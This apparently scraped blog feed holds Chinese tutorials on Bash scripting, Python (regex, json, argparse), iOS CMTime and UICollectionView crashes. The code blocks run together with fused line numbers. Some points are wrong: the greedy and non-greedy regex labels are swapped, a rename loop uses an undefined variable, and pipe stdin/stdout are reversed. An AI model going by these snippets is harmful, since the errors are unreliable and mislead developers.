let指令除了算数运算符，还可以使用内置指令let进行更直接的算数运算, 和算数预算符不同，let内部不需要dollar取值符号 12345count=0echo $countlet count+1echo $count expr指令GNU还有内置函数expr也可以用来进行数学运算，但是要注意的是expr数学运算符号左右要有空格，并且要转译星号来进行乘法 123456a=10b=5//expr $a+$b //错误！！会输出10+5expr $a + $b //15expr $a \\* $b //50expr $a / $b //2 综合使用一个简单的十秒倒计时 12345678count=10echo &quot;Count down 10 second for prepare database...\\n\\n&quot;while (( $count&gt;0 ))do sleep 1 &amp;&amp; echo $count &amp;&amp; let &quot;count--&quot; done","tags":[{"name":"Shell","slug":"Shell","permalink":"http://yoursite.com/tags/Shell/"}]},{"title":"Shell三连(九)：获取shell命令的返回值","date":"2018-12-08T15:00:00.000Z","path":"2018/12/09/Shell三连09获取shell命令的返回值/","text":"获取bash的返回值存在两种方式 dollar符号+括号 Backtick符号：注意不是单引号，是ESC按键下边那个 1234value1=$(echo hello)value2=`echo hello` 两者没有区别 获得当前运行结果的返回值可以使用 dollar符号+问号 来获得当前最后一个命令的返回值，从而判断是否执行成功,通常0代表没有错误 123echo $?cd not_exist_directoryecho $? 可以得到输出 1230bash: cd: not_exist_directory: No such file or directory1","tags":[{"name":"Shell","slug":"Shell","permalink":"http://yoursite.com/tags/Shell/"}]},{"title":"Shell三连(八)：键盘输入到变量","date":"2018-12-07T15:00:00.000Z","path":"2018/12/08/Shell三连08键盘输入到变量/","text":"read 函数自带函数read可以获取stdin输入，注意以下两点 仅仅获取一个变量时，不会解析空格 一次性获取多个时，除了最后一个以外，会以空格做分隔 使用 this is a car 作为keyboard input 12345678910# 获取一个read carecho $car # this is a car# 获取多个，最后一个不会以空格分隔read car1 car2 car3echo $car1 # thisecho $car2 # isecho $car3 # a car","tags":[{"name":"Shell","slug":"Shell","permalink":"http://yoursite.com/tags/Shell/"}]},{"title":"Shell三连(七)：STDIN重定向执行字符串","date":"2018-12-06T15:00:00.000Z","path":"2018/12/07/Shell三连07STDIN重定向执行字符串/","text":"Sh 的 -c 参数可以把一串字符串当作命令来执行, 以下结果是一样的 12echo &quot;Hello&quot;sh -c &quot;echo \\&quot;Hello\\&quot;&quot; sudo 获取多命令权限如果我想通过重定向给一个没有权限的文件添加内容，使用直接写法会因为 给了echo权限，而没给重定向权限 失败 12345&#x2F;&#x2F;Failuresudo echo &quot;Hello&quot; &gt;&gt; &#x2F;no_permission_file &#x2F;&#x2F;Successsudo sh -c &quot;echo \\&quot;Hello\\&quot;&quot; &gt;&gt; &#x2F;no_permission_file Docker执行RUN CMD EXECUTEDocker官方文档中有特意的提示，需要在Dockerfile里使用该方法触发RUN 和 CMD 12Note: Unlike the shell form, the exec form does not invoke a command shell. ..... RUN [ &quot;echo&quot;, &quot;$HOME&quot; ] ..... for example: RUN [ &quot;sh&quot;, &quot;-c&quot;, &quot;echo $HOME&quot; ]. 或者在Host主机执行一些复杂的命令 12docker exec -i $DOCKER_NAME sh -c &quot;mysqldump -uroot -proot -P 3306 --default-character-set&#x3D;utf8mb4 $DATABASE_NAME&gt; $BACKUP_PATH&quot;","tags":[{"name":"Shell","slug":"Shell","permalink":"http://yoursite.com/tags/Shell/"}]},{"title":"Shell三连(六)：如何读懂shell说明书man","date":"2018-12-05T15:00:00.000Z","path":"2018/12/06/Shell三连06如何读懂shell说明书man/","text":"查找命令和说明根据Linux基本知识 目的 操作 查找 输入任何字母，双击Tab，即可联想到相关命令 说明 输入man command，command代指任意命令 读懂说明我们以 find 方法为例解释说明， 执行 man find 12345678910111213FIND(1) BSD General Commands Manual FIND(1)NAME （这里是对该命令的简介） find -- walk a file hierarchySYNOPSIS （这里是语法说明） find [-H | -L | -P] [-EXdsx] [-f path] path ... [expression] find [-H | -L | -P] [-EXdsx] -f path [path ...] [expression]DESCRIPTION （这里是是详细说明） The find utility recursively descends the directory tree for each path listed, evaluating an expression (composed of the &#96;&#96;primaries&#39;&#39; and &#96;&#96;operands&#39;&#39; listed below) in terms of each file in the tree. 这里主要是看 SYNOPSIS 的语法说明 符号 代表 说明 无修饰 find、path 必须输入，不可少 中括号 [-EXdsx]、[-f paht] 可选，可以不输入 省略号 … 可多个 也就是说 SYNOPSIS 中描述的两种命令要遵循以下几点 find都是不可少的 path 和 -f path 至少要存在一个 其他的都是可选的 细节就需要看详细说明 DESCRIPTION 之后的东西了 搜索关键字和退出man 指令的是使用的类似 vim 命令模式，输入 q 可以直接退出 如果要搜索可以输入 /string 来搜索，使用n 或者 shift+n 来跳转下一个或者上一个关键词","tags":[{"name":"Shell","slug":"Shell","permalink":"http://yoursite.com/tags/Shell/"}]},{"title":"Shell三连(五)：递归遍历目录处理文件","date":"2018-12-04T15:00:00.000Z","path":"2018/12/05/Shell三连05递归遍历目录处理文件/","text":"递归目录、处理文件递归一个目录我们可以使用 find 命令得到每一行 并且将输出重定向到while方法 在while的条件判断中使用 read line 来处理每一行 read获取到 $line 变量，当无法读取到line则条件失败结束while循环 12345678index&#x3D;0find . -name *.jpg | while read line;do index&#x3D;$((index+1)) target&#x3D;&quot;image$(printf &quot;%03d&quot; $index).jpg&quot; mv &quot;$line&quot; &quot;.&#x2F;$fresh&quot;done 数字运算根据我们示例代码，我们需要做个递增的index 根据StackOverfow的回答在shell中存在一个概念 Arithmetic Expansion 算术扩展， 可以使用如下表达 123456Use arithmetic expansion: $((EXPR))num&#x3D;$((num1 + num2))num&#x3D;$(($num1 + $num2)) # also worksnum&#x3D;$((num1 + 2 + 3)) # ...num&#x3D;$[num1+num2]","tags":[{"name":"Shell","slug":"Shell","permalink":"http://yoursite.com/tags/Shell/"}]},{"title":"Shell三连(四)：条件命令和管线Pipe命令","date":"2018-12-03T15:00:00.000Z","path":"2018/12/04/Shell三连04条件命令和管线Pipe命令/","text":"多重命令执行根据Linux教材里面提到了两种多重命令执行方式 条件命令 &amp;&amp; ||简单的与或逻辑，如果使用 &amp;&amp; 就是前一个执行成功才执行后一个，而或逻辑 || 则前一个失败执行下一个 其基于逻辑命令的返回值是否等于0， 0为正常执行完毕 12cd ~&#x2F;Desktop &amp;&amp; echo &quot;first cmd return 0, this is second cmd&quot; cd ~&#x2F;Desktop2 || echo &quot;first cmd return not 0, this is second cmd&quot; 管线命令 Pipe根据文章标准输入输出重定向可以把之前命令的标准输出（stdin）作为之后命令的输入（stdout） 以我们常见的grep举例 1234567891011# 单独执行grep，会进入输入模式，如果换行前存在test，则会再次输出grep &quot;test&quot;# 单独执行 ls ，会列出当前目录的文件夹和文件ls # 管线操作# 将ls的输出作为grep的输出，来过滤文件名ls . | grep &quot;test&quot;","tags":[{"name":"Shell","slug":"Shell","permalink":"http://yoursite.com/tags/Shell/"}]},{"title":"Shell三连(三)：文件的读写和重定向","date":"2018-12-02T15:00:00.000Z","path":"2018/12/03/Shell三连03文件的读写和重定向/","text":"文件读写shell里最重要对一个概念就是流，所谓流就是 byte stream 面向流只有 输入 和 输出 默认的 输入是 stdin，输出是 stdout、stderr 输入和输出可以被重定向来管理字节流，从而达到文件读写的目的 文件操作 重定向逻辑 文件写 重定向输出stdout至文件 文件读 重定向文件至输入stdin 根据网络教程文件的重定向已经对基本知识介绍的很清楚，本文仅仅针对读写进行举例 文件写123456789echo &quot;line1&quot; &gt; file.txtcat file.txt &#x2F;&#x2F;新建并写入一行字符串echo &quot;line2&quot; &gt;&gt; file.txtcat file.txt &#x2F;&#x2F;追加一行字符串echo &quot;line3&quot; &gt; file.txtcat file.txt &#x2F;&#x2F;写入一行字符串并且替换原内容 文件读文件读取到运行时的变量并不牵扯到重定向的逻辑, 直接使用 cat 获取文件内容并且赋值给变量即可 12var1&#x3D;$(cat file.txt)echo &quot;read var1 from file.txt : \\n$var1&quot; 如果非要使用 stdin 重定向，则可以使用以下代码，代表将 file.txt 作为输入并且dollar符号执行，结果赋值给var2 12var2&#x3D;$(&lt;file.txt)echo &quot;read var2 from file.txt : \\n$var2&quot; 输入重定向是什么对网络教程的补充输出重定向很好理解，所有terminal的输出都会作为 byte stream保存到某个文件 而如何理解输入重定向，以下是对网络教程的补充 1234567echo &quot;line1&quot; &gt; file.txtecho &quot;line2&quot; &gt;&gt; file.txtwc -l file.txt &#x2F;&#x2F; 输出 2 file.txtwc -l &lt; file.txt &#x2F;&#x2F; 输出 2 其中 2 代表 2行， 为何第一个带有文件名，第二个不带文件名，我们通过 man wc 来分析，文档显示以下原文 123456789&#x2F;&#x2F;用于统计 词、行、字符、和比特数wc -- word, line, character, and byte count&#x2F;&#x2F;-l 参数代表统计行数-l The number of lines in each input file&#x2F;&#x2F;补充说明，如果没有文件输入，则从stdin读取，并且不显示文件名If no files are specified, the standard input is used and no file name is displayed. The prompt will accept input until receiving EOF, or [^D] in most environments. 其中 EOF（代表End of File），文件自然自带EOF，如果是 Here Document 通常是 Ctrl+D 用于输入一个EOF 可见仅仅输出 2 的shell命令执行了以下操作 wc -l 不带文件名，触发从stdin读取 &lt; file.txt 将 file重定向到 stdin 作为输入 file.txt 自带 EOF 输出行数且不带文件名 我们可以使用 Here Document 来模拟这个过程 1234wc -l&#x2F;&#x2F;输入line1 换行&#x2F;&#x2F;输入ling2 换行&#x2F;&#x2F;操作 Ctrl+D 为什么echo不能响应输入重定向对于输入重定向，一般刚刚学会都会想使用echo 来输出文件重定向来的内容，但是执行完毕却没有输出类似的问题 1echo &lt; file.txt 原因在于 file.txt 的内容被重定向到了 stdin，但是echo指令并不会从 stdin 读取任何内容，所以无法输出文件的内容 所以说一个指令是否能否使用输入重定向，决定于它是否从stdin读取内容 一些教程中需要高亮的基础知识文件描述符一般情况下，每个 Unix/Linux 命令运行时都会打开三个文件： 标准输入文件(stdin)：stdin的文件描述符为0，Unix程序默认从stdin读取数据。 标准输出文件(stdout)：stdout 的文件描述符为1，Unix程序默认向stdout输出数据。 标准错误文件(stderr)：stderr的文件描述符为2，Unix程序会向stderr流中写入错误信息。 所以说如果使用了数字代替字符串，代表三个标准文件，例如将错误追加输出到file 1command 2 &gt;&gt; file.txt Here DocumentHere Document 是 Shell 中的一种特殊的重定向方式，用来将输入重定向到一个交互式 Shell 脚本或程序 个人的理解，是用stdin 模拟一个基于运行时的文件，所以叫 Here Document 123command &lt;&lt; delimiter documentdelimiter 一般来讲 delimiter 使用 EOF 12345cat &lt;&lt; EOFline1line2line3EOF 值得注意的两点 结尾的delimiter 一定要顶格写，前面不能有任何字符，后面也不能有任何字符，包括空格和 tab 缩进 开始的delimiter前后的空格会被忽略掉 &gt;&amp; 和 &amp;&gt;这里的&amp;没有固定的意思 放在&gt;后面的&amp;，表示重定向的目标不是一个文件，而是一个文件描述符， 换言之 2&gt;1 代表将stderr重定向到当前路径下文件名为1的regular file中 而2&gt;&amp;1代表将stderr重定向到文件描述符为1的文件 12$ command &gt; file 2&gt;&amp;1$ command &gt;&gt; file 2&gt;&amp;1 顺序问题123find &#x2F;etc -name .bashrc &gt; list 2&gt;&amp;1# 我想问为什么不能调下顺序,比如这样find &#x2F;etc -name .bashrc 2&gt;&amp;1 &gt; list 先将要输出到stdout的内容重定向到文件，此时文件list就是这个程序的stdout，再将stderr重定向到stdout，也就是文件list 先将要输出到stderr的内容重定向到stdout，此时会产生一个stdout的拷贝，作为程序的stderr，而程序原本要输出到stdout的内容，依然是对接在stdout原身上的，因此第二步重定向stdout，对stdout的拷贝不产生任何影响","tags":[{"name":"Shell","slug":"Shell","permalink":"http://yoursite.com/tags/Shell/"}]},{"title":"Shell三连(二)：如何使用正则获取变量","date":"2018-12-01T15:00:00.000Z","path":"2018/12/02/Shell三连02如何使用正则获取变量/","text":"心路历程在shell的正则表达式里常用的有 sed(stream editor) grep(file pattern searcher) BASH_REMATCH(Bash3.x自带表达式 =~ ) 值得注意的是以上三种都不支持非贪婪模式（non-greedy）的匹配，因为无法对一行字符串进行多次匹配，参考regex in bash expression Example我们假设摘取以下字符串里的key值 some_important_string 12string&#x3D;&quot;HEREISKEY some_important_string HEREISVALUE some_value&quot; sedsed的使用方法比较特别，需要遵守 s/regexp/replacement/flags 的使用模版参考文档 \\1 表示(&quot;some_(.+)&quot;) 匹配的内容 \\2 表示(.+)匹配的内容 代表将表达式 “^.* (&quot;some_(.+)&quot;) .*” 匹配到的字符替换为 “\\1” 也就是 “(&quot;some_(.+)&quot;)” 并输出 12echo &quot;HEREISKEY \\&quot;some_important_string\\&quot; HEREISVALUE \\&quot;some_value\\&quot;&quot; | sed -E &quot;s&#x2F;^.* (\\&quot;some_(.+)\\&quot;) .*&#x2F;\\1&#x2F;&quot; grepgrep不像sed一样可以使用 -E 参数来表达正则，而不用对大部分符号使用转义符 12echo &quot;HEREISKEY \\&quot;some_important_string\\&quot; HEREISVALUE \\&quot;some_value\\&quot;&quot; | grep -o -E &quot;\\&quot;some_(.+)\\&quot;\\s&quot; BASH_REMATCH该方法为自带表达式 推荐使用这一种 其思想和 sed一样，是按照顺序将结果放入数组 | 数组下标 | 匹配表达式 | 匹配结果 || :————- | :————- || BASH_REMATCH[0] | ^.( &quot;some_(.+)&quot; ). | HEREISKEY “some_important_string” HEREISVALUE “some_value” || BASH_REMATCH[1] | ( &quot;some_(.+)&quot; ) | “some_important_string” || BASH_REMATCH[2] | (.+) | important_string | 12if [[ &quot;HEREISKEY \\&quot;some_important_string\\&quot; HEREISVALUE \\&quot;some_value\\&quot;&quot; &#x3D;~ ^.*( \\&quot;some_(.+)\\&quot; ).* ]] ; then echo $&#123;BASH_REMATCH[1]&#125;; fi 三者区别 命令 思想 sed、BASH_REMATCH 先匹配全文，然后将自表达式匹配结果依次放入index grep 直接截取表达式匹配到的部分，并不会把自表达式放入index","tags":[{"name":"Shell","slug":"Shell","permalink":"http://yoursite.com/tags/Shell/"}]},{"title":"Shell三连(一)：脚本参数设定和解析","date":"2018-11-30T15:00:00.000Z","path":"2018/12/01/Shell三连01脚本参数设定和解析/","text":"心路历程Shell的参数解析分为两种 直接从运行行取参数 $0 $1这种 进行复杂的参数分析，使用 getopts getopts的内置参数根据查询可知 getopts is defined in POSIX®. ，我们找到了一个参考页面，很多关于getopts的讲解里，都说到了两个变量 OPTIND 和 OPTARG， 是两个全局变量，一个代表getopts当前读取到的Index，一个是当前读取到的变量的值 OPTIND123456OPTIND&#x3D;1...shift &quot;$((OPTIND-1))&quot; 其中OPTIND代表的意思就是 Holds the index to the next argument to be processed，OPTIND is initially set to 1, and needs to be re-set to 1 if you want to parse anything again with getopts 等于1的原因是第0个是getopts命令行本身，和$0一个原理 shift的作用位置参数可以用shift命令左移。比如shift 3表示原来的$4现在变成$1，原来的$1、$2、$3丢弃 在执行完 getopts后边可能还会执行，需要把解析过的参数丢弃，所以加上shift “$((OPTIND-1))” 使用方法和OPTARG 调用getopts方法 然后对getopts的结果进行while循环 getopts 后根据顺序可以接三个参数 getopts OPTSTRING VARNAME [ARGS…] 参数 作用 OPTSTRING 需要解析的参数 VARNAME 每次解析到的参数 ARGS 如果shell脚本不输入任何参数，则使用这个为默认输入 123456789101112131415161718192021222324OPTIND&#x3D;1while getopts &quot;:a:bc&quot; opt; do case $opt in a) echo &quot;-a was triggered, Parameter: $OPTARG&quot; ;; b) echo &quot;-b was triggered, Parameter: $OPTARG&quot; ;; c) echo &quot;-c was triggered, Parameter: $OPTARG&quot; ;; \\?) echo &quot;Invalid option: -$OPTARG&quot; exit 1 ;; :) echo &quot;Option -$OPTARG requires an argument.&quot; exit 1 esacdoneshift &quot;$((OPTIND-1))&quot; colon 冒号的作用在OPTSTRING中如果想对哪个参数后边可以跟一个值，只需要在其后边加冒号 “:” 就可以了，如果开头就是冒号，代表静默异常模式，就是一旦参数异常不出发 “?” Invalid option 如何使用单词参数根据Stack Overflow回答 getopts 并不提供单词参数的解析能力，所可以通过遍历参数列表+Shift切换的模式进行解析 首先把长参数转化为短参数，使用到了 set 然后把短参数根据 getopts 解析 有关 set – “$@” “-h” 指令的含义，参考Bash的内置命令set，加入 – 是为了保证 $@ 不会被当成可选字段 [–abefhkmnptuvxBCEHPT] 12345678910111213141516171819202122232425262728293031# Transform long options to short onesfor arg in &quot;$@&quot;; do shift #切换下一个 case &quot;$arg&quot; in &quot;--help&quot;) set -- &quot;$@&quot; &quot;-h&quot; ;; &quot;--rest&quot;) set -- &quot;$@&quot; &quot;-r&quot; ;; &quot;--ws&quot;) set -- &quot;$@&quot; &quot;-w&quot; ;; *) set -- &quot;$@&quot; &quot;$arg&quot; esacdone# Default behaviorrest&#x3D;false; ws&#x3D;false# Parse short optionsOPTIND&#x3D;1while getopts &quot;hrw&quot; optdo case &quot;$opt&quot; in &quot;h&quot;) print_usage; exit 0 ;; &quot;r&quot;) rest&#x3D;true ;; &quot;w&quot;) ws&#x3D;true ;; &quot;?&quot;) print_usage &gt;&amp;2; exit 1 ;; esacdone# remove options from positional parametersshift $(expr $OPTIND - 1)","tags":[{"name":"Shell","slug":"Shell","permalink":"http://yoursite.com/tags/Shell/"}]},{"title":"Python三连(五)：相等和类型判断的细节","date":"2018-10-04T15:00:00.000Z","path":"2018/10/05/Python三连05相等和类型判断的细节/","text":"指针相等、值相等Python中存在 is 和 == 两种相等，和Java、OC不同的是含义恰好不一样 语言 值相等 地址相等（实例相等） Python == is Java equals() == OC isEqual == 类判断、实例判断Python中也存在 isinstance() 和 type() 两个对类型判断的方法, 对应Java和OC的是 语言 值相等 地址相等（实例相等） Python isinstance(obj, clazz) type(obj) is clazz Java obj instanceof clazz object.getClass() != clazz.class OC isKindOf isMemeberOf","tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"Python三连(四)：获取键盘输入到变量","date":"2018-10-03T15:00:00.000Z","path":"2018/10/04/Python三连04获取键盘输入到变量/","text":"Python 2.x 和 3.x 的区别在Python 2.x 中存在两个获取Keyboard Input的函数，一般来讲都要用 raw_input() input() raw_input() 其根据教程解释区别关键在于是否读取一个合法的python类型，如果时非法python类型，会报错 1234567891011# 读取input的内容赋值name = input(&quot;Enter your name: &quot;)# 输入 somename 注意不要带引号print(name)# 直接报错, 因为会将 somename 作为一个变量解析Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt; File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;NameError: name &#x27;somename&#x27; is not defined 而在Python 3.x 中，则直接取消了raw_input()，把原本的input改为了同样的功能 因为input()函数在2.x中几乎没人用 结论在Python3.x 中直接使用input()， 如果是2.x则使用 raw_input()","tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"Python三连(三)：Json的读写","date":"2018-10-02T15:00:00.000Z","path":"2018/10/03/Python三连03Json的读写/","text":"Json库的使用Json库的输入和输出函数分别是，最后s的区别是代指 string load(s) : 把File或者JsonString装载到Python运行时Dict对象 dump(s) : 把对象输出到File或者JsonString 123456789101112import jsondictionary &#x3D; &#123; &quot;key&quot;: &quot;This is Key&quot;, &quot;value&quot;: &quot;This is Value&quot;, &quot;sub&quot;: &#123; &quot;key&quot;: &quot;Sub Key&quot;, &quot;value&quot;: &quot;Sub Value&quot; &#125;&#125; Json对String的读写主要是使用dumps和loads方法来完成 123456json_sting &#x3D; json.dumps(dictionary)runtime_dict &#x3D; json.loads(json_sting)print(&quot;json_sting Type: %s\\nruntime_dict Type: %s&quot; % (str(type(json_sting)), str(type(runtime_dict))))print(json_sting) Json和File的读写主要是使用dump和load方法来完成，注意如果file被open之后，需要json.load则不能运行read() 或者 readlines() 方法 12345678910filo_write &#x3D; open(&quot;.&#x2F;strings.json&quot;, &quot;w+&quot;)json.dump(dictionary, filo_write)filo_write.close()filo_read &#x3D; open(&quot;.&#x2F;strings.json&quot;, &quot;r&quot;)runtime_dict &#x3D; json.load(filo_read)filo_read.close()print(&quot;runtime_dict Type: %s&quot; % str(type(runtime_dict)))print(runtime_dict) 格式调整如果使用默认格式，dump出的Json字符串是没有换行的，所以我们可以使用两个参数来调整格式 参数 作用 indent 控制缩进 separators 用一个2纬元组控制逗号加不加空格，以及冒号前后的空格 1print(json.dumps(dictionary, indent&#x3D;4, separators&#x3D;(&#39;,&#39;, &#39; : &#39;)))","tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"Python三连(二)：如何使用正则获取变量","date":"2018-10-01T15:00:00.000Z","path":"2018/10/02/Python三连02如何使用正则获取变量/","text":"使用正则Python里的正则库是, 使用的方式有两种 直接匹配 match 预编译匹配 compile 12345678import restring &#x3D; &#39;&#39;&#39;&lt;string name&#x3D;&quot;TP40008091&quot; title&#x3D;&quot;CH100-SWW&quot;&gt;The Move Away from Threads&lt;&#x2F;string&gt;&#39;&#39;&#39;# 直接匹配match &#x3D; re.match(&quot;&lt;string *name&#x3D;\\&quot;(?P&lt;key&gt;.*?)\\&quot;.*&gt;(?P&lt;value&gt;.*)&lt;&#x2F;string&gt;&quot;, string)# 预编译匹配match &#x3D; re.compile(&quot;&lt;string *name&#x3D;\\&quot;(?P&lt;key&gt;.*?)\\&quot;.*&gt;(?P&lt;value&gt;.*)&lt;&#x2F;string&gt;&quot;).match(string) 注意 直接匹配和预编译匹配返回对象的match函数的入参不一样 获取到变量获取到变量主要是参考re的说明文档中 (?P…) The substring matched by the group is accessible by name. 返回的结果match是一个 Match() 的Object，为系统的自带class 12345678match &#x3D; re.compile(&quot;&lt;string *name&#x3D;\\&quot;(?P&lt;key&gt;.*?)\\&quot;.*&gt;(?P&lt;value&gt;.*)&lt;&#x2F;string&gt;&quot;).match(string)key &#x3D; match.group(&quot;key&quot;)value &#x3D; match.group(&quot;value&quot;)print(&quot; Key : %s \\n Value : %s&quot; % (key, value))# Key : TP40008091# Value : The Move Away from Threads 匹配多行上述是对单一字符串的匹配，如果想要匹配多行（例如文件的内容），可以使用re中带有 flags=0 的方法flags参数 标记位 含义 A ASCII I IGNORECASE L LOCALE M MULTILINE S DOTALL X VERBOSE U UNICODE 使用的应该是 re.M 这个参数，不同的参数之间可以使用bit运算 12345678910111213content &#x3D; &#39;&#39;&#39;&lt;string name&#x3D;&quot;TP40000001&quot; title&#x3D;&quot;CH101-SWW&quot;&gt;The Move&lt;&#x2F;string&gt;&lt;string name&#x3D;&quot;TP40000002&quot; title&#x3D;&quot;CH102-SWW&quot;&gt;The Move Away&lt;&#x2F;string&gt;&lt;string name&#x3D;&quot;TP40000003&quot; title&#x3D;&quot;CH103-SWW&quot;&gt;The Move Away from Threads&lt;&#x2F;string&gt;&#39;&#39;&#39;matches &#x3D; re.compile(&quot;&lt;string *name&#x3D;\\&quot;(?P&lt;key&gt;.*?)\\&quot;.*&gt;(?P&lt;value&gt;.*)&lt;&#x2F;string&gt;&quot;, re.M | re.U).finditer(content)for match in matches: key &#x3D; match.group(&quot;key&quot;) value &#x3D; match.group(&quot;value&quot;) print(&quot; Key : %s \\n Value : %s&quot; % (key, value)) 贪婪匹配和非贪婪匹配贪婪匹配和非贪婪匹配的原则主要在于回溯逻辑的不同，贪婪指的是尽可能匹配更多的字符，非贪婪则相反 1234567891011string &#x3D; &#39;&#39;&#39;&lt;string name&#x3D;&quot;TP40008091&quot; title&#x3D;&quot;CH100-SWW&quot;&gt;The Move Away from Threads&lt;&#x2F;string&gt;&#39;&#39;&#39;# 贪婪# Key : TP40008091&quot; title&#x3D;&quot;CH100-SWW# Value : The Move Away from Threadsgreed &#x3D; re.match(&quot;&lt;string *name&#x3D;\\&quot;(?P&lt;key&gt;.*?)\\&quot;.*&gt;(?P&lt;value&gt;.*)&lt;&#x2F;string&gt;&quot;, string)# 非贪婪# Key : TP40008091# Value : The Move Away from Threadssimple &#x3D; re.match(&quot;&lt;string *name&#x3D;\\&quot;(?P&lt;key&gt;.*)\\&quot;.*&gt;(?P&lt;value&gt;.*)&lt;&#x2F;string&gt;&quot;, string) 区别在于子表达式 (?P.*) 和 (?P.*?) 中最后问号的差别 pattern中的r什么意思很多晚上的回答中，喜欢在pattern之前加入小写字母r，这个在python中代表 Raw 的意思，是字符串规则的一部分和正则规定无关 123456# 匹配match &#x3D; re.match(&quot;&lt;string *name&#x3D;\\&quot;(?P&lt;key&gt;.*?)\\&quot;.*&gt;(?P&lt;value&gt;.*)&lt;&#x2F;string&gt;&quot;, string)# Raw 匹配match &#x3D; re.match(r&quot;&lt;string *name&#x3D;\\&quot;(?P&lt;key&gt;.*?)\\&quot;.*&gt;(?P&lt;value&gt;.*)&lt;&#x2F;string&gt;&quot;, string) 区别在于StackOverflow答案中的举例 1234print(&#39;\\n&#39;) # 换行print(r&#39;\\n&#39;) # 字符串\\nprint(&#39;\\b&#39;) # 空格print(r&#39;\\b&#39;) # 字符串\\b","tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"Python三连(一)：脚本参数设定和解析","date":"2018-09-30T15:00:00.000Z","path":"2018/10/01/Python三连01脚本参数设定和解析/","text":"心路历程Python的参数解析经历了以下几个库 getopt————optparse————argparse 最新版最新版可以参考ArgParse官方文档, 其他的参数解析方法都没这个好用，整体的思路就是 实例化一个argparse对象 通过add_argument添加想要解析的对象 调用parse_args()进行参数解析 1234567891011121314parser &#x3D; argparse.ArgumentParser(description&#x3D;&#39;Process some integers.&#39;)parser.add_argument( &quot;-f&quot;, &quot;--file&quot;, action&#x3D;&quot;store&quot;, type&#x3D;str, dest&#x3D;&quot;filename&quot;, default&#x3D;&quot;default_filename&quot;, help&#x3D;&quot;save a file name&quot;)args &#x3D; parser.parse_args()print(args.filename) 具体参数具体参数可以参考章节 16.4.3. The add_argument() method 比较难以理解的是 metavar 和 default，区别在于 metavar是用于帮助文档的标志位，而default是运行时的默认值","tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"CMTime的含义和取值方法","date":"2018-06-12T15:00:00.000Z","path":"2018/06/13/CMTime的含义和取值方法/","text":"CMTime是什么CMTime是框架 Core Media里的时间结构体，其核心是 使用两个Int来表达计算机无法准确计算的Float值 源自于计算机媒体行业的约定 官方文档 1A struct representing a time value such as a timestamp or duration. Apple官方推荐根据CMTime的定义，其中TimeScale代表把一秒分隔成多少份 Unit，而Value代表当前有几个 Unit 1Thus if the timescale is 4, each unit represents a quarter of a second; if the timescale is 10, each unit represents a tenth of a second, and so on. 例如官方文档中说，如果 123timescale &#x3D; 4 &#x2F;&#x2F;代表每秒被分隔成4份unit &#x3D; 0.25s &#x2F;&#x2F; 每个unit代表0.25sCMTime(3,4) &#x3D; 0.75s &#x2F;&#x2F;由3个Unit构成，代表0.75s 根据某些其他Blog的记载这可能是最详细的CMTime教程，官方文档 曾经出现过推荐把 timescale 设置成 600 理由是 600 是所有帧率的最小公倍数 1You frequently use a timescale of 600, because this is a multiple of several commonly used frame rates: 24 fps for film, 30 fps for NTSC (used for TV in North America and Japan), and 25 fps for PAL (used for TV in Europe). Using a timescale of 600, you can exactly represent any number of frames in these systems. 但是目前官方文档2019年2月已经没有这句话了，可能是帧率范围变大了 实际取值原则在实际项目中，如果取值原则如下 如果你有实例化后的PlayItem，则可以通过duration取到 如果你没有文件，你认识做相机或者录制视频的开发者，你们去口头约定一个 为什么我会知道，是因为开发相机的同事把TimeScale设置成了 30000 写到了MetaData里坑了我一把，他告诉我所有相机都是这样设置的。。。我不太相信","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"UI","slug":"UI","permalink":"http://yoursite.com/tags/UI/"}]},{"title":"CollectionView常见Crash处理","date":"2018-06-11T15:00:00.000Z","path":"2018/06/12/CollectionView常见Crash处理/","text":"总结CollectionView 常见Crash的原因主要是以下几种 DataSource的改变和 ViewItem的改变 对应不上 Collection增删时没有使用 BatchUpdate 导致问题1 Layout无效 其中最主要的就是问题1， 有很多种情况可以引起，我们根据错误提示解释 plus or minus the number of sections inserted or deleted1Invalid update: invalid number of sections. The number of sections contained in the collection view after the update (3) must be equal to the number of sections contained in the collection view before the update (4), plus or minus the number of sections inserted or deleted (0 inserted, 0 deleted). 这个问题都是因为DataSource最终状态和执行insert、delete的预期结果不一致导致的，常见的原因如下 没有使用BathUpdate如果同时改变Section和Item，则需要注意操作完毕 DataSource 后的方法，例如我们以下操作 存在4个section,每个section有5个item 删除第二个sect 删除第三个section的第一个 此时我们的的输入参数 12var sectSet = [1]var itemIndex = IndexPath(item: 0, section: 2) 得到了入参数后，错误的方法 1234567891011//此时DataSource还剩余 3个Section //删除了 sect[1] //此时DataSouce和CollectionView对映self.collection.deleteSections(sect)//删除 IndexPath(item: 0, section: 2)//错误！！//此时的sect[2]，是之前的第四个 sect[3](含有五个对象)//此时拥有4个对象的是 sect[1]self.collection.deleteItems(at: items)// DataSouce ！= CollectionView 无法对应//Crash 应该使用正确的方法， 使用Batch（批量）进行更新 1234self.collection.performBatchUpdates(&#123; self.collection.deleteSections(sect) self.collection.deleteItems(at: items) &#125;, completion: nil) 操作Section和Item后计算的Index不正确还有一种常见的错误是构造输入参数时的逻辑错误， 原因是操作DataSource时Index的动态变化 1234567891011121314151617181920//准备结果容器var sectSet = IndexSet()var itemIndexes = [IndexPath]()//改变DataSource//!!错误sects.remove(at: 1)//删除了第二个sect后//此时整个sects共有3个元素，而不是之前的4个//此时的 sects[2] 指向了原本第四个 sect[3](含有五个对象)sects[2].remove(at: 0)//执行结束原本 sects[2](此时已经动态变化为sects[1])//并没有元素被删除//储存结果sectSet.insert(1)//此时构造的入参还是(2,0)itemIndex.append(IndexPath(item: 0, section: 2))//输出结果作为CollectionView的入参//构造错误导致入参错误complete(sectSet, itemIndex)//Crash Heap corruption detected123Heap corruption detected, free list is damaged at 0x600002115bc0*** Incorrect guard value: 3GateOfBabylon(16767,0x11a3c65c0) malloc: *** set a breakpoint in malloc_error_break to debug 